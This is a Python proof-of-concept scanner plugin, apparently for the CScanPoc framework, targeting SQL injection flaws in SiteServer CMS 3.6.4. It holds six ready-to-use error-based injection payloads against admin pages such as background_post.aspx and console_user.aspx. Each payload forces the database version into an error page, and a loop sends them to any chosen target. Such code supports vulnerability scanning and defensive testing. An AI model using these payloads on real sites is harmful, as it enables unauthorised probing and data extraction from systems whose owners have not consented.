# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SiteServer_0008'  # 平台漏洞编号，留空
    name = 'SiteServer最新版3.6.4 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        SiteServer CMS是定位于中高端市场的CMS内容管理系统，能够以最低的成本、最少的人力投入在最短的时间内架设一个功能齐全、性能优异、规模庞大并易于维护的网站平台。
        SiteServer最新版3.6.4 存在多处SQL注入漏洞：
        /siteserver/bbs/background_post.aspx
        /siteserver/bbs/background_user.aspx
        /siteserver/cms/console_user.aspx
        /siteserver/cms/console_logSite.aspx
        /siteserver/cms/background_nodeGroup.aspx
        /siteserver/cms/background_mailSubscribe.aspx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SiteServer'  # 漏洞应用名称
    product_version = '3.6.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '11599909-9a9c-464f-9422-356ac29d5915'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                '/siteserver/bbs/background_post.aspx?UserName=&Title=%27%20and%20%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&DateFrom=&DateTo=&ForumID=0',
                '/siteserver/bbs/background_user.aspx?UserGroup=7&PageNum=0&Keyword=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&CreationDate=0&LastActivityDate=0',
                '/siteserver/cms/console_user.aspx?PageNum=0&Keyword=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0',
                '/siteserver/cms/console_logSite.aspx?UserName=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&Keyword=&DateFrom=&DateTo=&PublishmentSystemID=0&LogType=All',
                '/siteserver/cms/background_nodeGroup.aspx?PublishmentSystemID=0&SetTaxis=True&GroupName=test4%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&Direction=DOWN',
                '/siteserver/cms/background_mailSubscribe.aspx?PublishmentSystemID=0&Keyword=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&DateFrom=&DateTo=',
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)

                if code == 500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
